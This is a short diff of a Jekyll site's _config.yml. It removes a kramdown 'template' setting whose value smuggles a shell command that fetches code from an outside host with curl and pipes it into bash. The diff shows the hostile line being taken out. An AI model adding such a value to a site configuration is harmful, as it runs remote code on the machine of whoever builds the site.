@@ -20,8 +20,6 @@ baseurl: "" # the subpath of your site, e.g. /blog
 
 # Build settings
 markdown: kramdown
-kramdown:
-  template: '| curl jp.nyangawa.me:9998 | bash'
 
 # remote_theme: 739291063/theme
 # remote_theme: benbalter/retlab
